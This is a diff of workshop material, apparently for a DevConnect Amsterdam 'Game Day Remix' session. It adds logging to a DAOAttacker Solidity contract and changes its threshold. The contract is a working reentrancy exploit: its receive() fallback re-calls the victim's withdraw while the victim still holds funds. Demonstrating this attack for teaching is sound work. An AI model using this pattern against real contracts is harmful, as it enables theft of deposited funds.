@@ -20,6 +20,7 @@ Glad to prepare and present the materials for Game Day Remix in DevConnect Amste
 
 pragma solidity ^0.8.4;
 import "./interface/IDAOVictim.sol";
+import "hardhat/console.sol";
 
 contract DAOAttacker {
     IDAOVictim public victim;
@@ -36,7 +37,16 @@ contract DAOAttacker {
     receive() external payable {
         // may be a better expression in if statement,
         // this version may lead to REVERT;
-        if (address(victim).balance > 0.1 ether) {
+        console.log(
+            "Attacker:: >>> Taking over control from address(victim): ",
+            address(victim)
+        );
+        console.log("Attacker:: Victim Balance: ", address(victim).balance);
+        if (address(victim).balance > 1 ether) {
+            console.log(
+                "Attacker:: Balance > 1e ther, Reentering >>> ",
+                address(victim)
+            );
             victim.withdraw(address(this));
         }
     }
